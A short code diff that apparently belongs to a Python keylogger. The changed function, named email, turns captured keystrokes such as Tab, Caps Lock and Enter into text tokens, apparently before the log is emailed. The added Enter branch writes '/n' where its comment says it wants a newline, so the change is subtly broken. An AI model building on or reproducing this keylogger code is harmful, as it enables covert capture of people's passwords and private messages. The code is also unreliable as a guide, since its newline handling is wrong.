@@ -29,6 +29,8 @@ def email(keys):
             k = "<tab>"
         elif key == "Key.caps_lock":
             k = "<caps_lock>"
+        elif key =="Key.enter":           #If new line is added when Enter Key is pressed
+            k = "/n"
 
         elif key.find("Key") > 0:       
             k = ""
